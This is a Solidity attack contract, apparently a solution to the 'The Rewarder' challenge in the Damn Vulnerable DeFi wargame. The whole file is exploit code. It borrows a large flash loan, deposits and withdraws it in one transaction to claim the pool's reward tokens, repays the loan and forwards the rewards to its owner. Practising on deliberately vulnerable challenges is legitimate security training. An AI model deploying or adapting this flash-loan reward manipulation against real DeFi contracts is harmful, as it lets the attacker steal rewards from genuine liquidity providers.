// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract Attacker5 {
    address private immutable rewardPoolAddr;
    address private immutable rewardTokenAddr;
    address private immutable liquidityTokenAddress;
    address private immutable owner;

    constructor(
        address _rewardPoolAddr,
        address _liquidityTokenAddress,
        address _rewardTokenAddr
    ) {
        rewardPoolAddr = _rewardPoolAddr;
        rewardTokenAddr = _rewardTokenAddr;
        liquidityTokenAddress = _liquidityTokenAddress;
        owner = msg.sender;
    }

    function attack(address _loanAddr) public {
        FlashLoanerPool(_loanAddr).flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 _amount) public {
        DamnValuableToken liquidityToken = DamnValuableToken(liquidityTokenAddress);
        TheRewarderPool rewardPool = TheRewarderPool(rewardPoolAddr);
        RewardToken rewardToken = RewardToken(rewardTokenAddr);

        liquidityToken.approve(rewardPoolAddr, _amount);
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);
        liquidityToken.transfer(msg.sender, _amount);

        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
